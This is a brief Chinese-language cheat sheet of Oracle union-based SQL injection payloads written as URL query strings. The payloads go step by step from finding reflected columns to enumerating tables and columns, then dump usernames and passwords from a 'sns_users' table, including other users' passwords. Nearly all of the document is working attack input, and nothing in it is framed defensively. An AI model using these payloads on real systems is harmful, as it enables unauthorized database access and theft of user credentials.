测试回显位置 ?id=1 union select '1','2' from dual

爆破数据库名?id=1 and 1=2 union select '1',(select table_name from user_tables where rownum=1) from dual

模糊爆破?id=1 and 1=2 union select '1',(select table_name from user_tables where rownum=1 and table_name like '%user%') from dual

爆破列名?id=1 and 1=2 union select '1',(select column_name from all_tab_columns where rownum=1 and table_name='sns_users') from dual

爆破其他列名?id=1 and 1=2 union select '1',(select column_name from all_tab_columns where rownum=1 and table_name='sns_users' and column_name not in ('USER_NAME')) from dual

爆破数据?id=1 and 1=2 union select user_name,user_pwd from "sns_users"

查看其他用户的密码?id=1 and 1=2 union select user_name,user_pwd from "sns_users" where user_name<>'hu'
